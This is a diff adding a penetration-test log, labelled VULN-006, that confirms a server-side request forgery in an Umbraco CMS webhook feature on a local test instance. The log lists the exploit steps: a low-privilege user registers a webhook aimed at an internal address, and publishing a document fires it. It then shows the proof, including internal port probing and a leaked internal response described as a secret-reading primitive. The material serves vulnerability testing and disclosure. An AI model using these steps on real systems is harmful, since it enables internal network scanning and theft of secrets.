@@ -1,0 +1,18 @@
+==============================================================================
+VULN-006: SSRF via unvalidated webhook target URL (OOB confirmed; full-read via Debug)
+==============================================================================
+[INFO] target: http://localhost:29184
+[INFO] vulnerable code path: WebhookService.cs:37-45 (no URL validation) -> WebhookFiring.cs:112-137 (POST raw URL, attacker headers)
+[SETUP] admin authenticated to Management API
+[SETUP] provisioned NON-admin Settings user lowuser_2d7517cf@example.invalid (policy TreeAccessWebhooks OK)
+[SETUP] OOB listener bound 0.0.0.0:57221; container-reachable target = http://172.18.0.1:57221/canary-e7adad984b76
+[SETUP] created a document 965aba95-646c-4120-8868-5c7553e98980 to publish (fires the webhook event)
+[STEP] POST /webhook (target=http://172.18.0.1:57221/canary-e7adad984b76) as lowuser_2d7517cf@example.invalid -> 201 (internal/loopback URL accepted with NO scheme/host/IP validation)
+[STEP] PUT /document/{id}/publish -> 200 (raises Umbraco.ContentPublish)
+[STEP] waiting for the server to originate the outbound request (webhook period = 10s)...
+[PROOF] OOB listener received a POST from the app container (172.18.0.2) to /canary-e7adad984b76
+[PROOF] the request carried our attacker header X-Canary=e7adad984b76 and User-Agent='Umbraco-Cms/18.3.0-rc.preview.34' (server-originated = SSRF)
+[PROOF] blind oracle — OPEN internal port logged: statusCode=OK (200) isSuccess=True
+[PROOF] Hosting:Debug=true leaked the FULL response body from the internal target: '{"oob":"canary-hit","secret":"internal-service-only"}' (this is the IMDS/secret-read primitive)
+[PROOF] blind oracle — CLOSED internal port logged: statusCode=ConnectionError exceptionOccured=True (open vs closed differ => internal port scanner)
+==> VULN-006: CONFIRMED — server originated an HTTP request to our attacker-chosen internal host with attacker headers; Debug=true leaked the full response body = SSRF
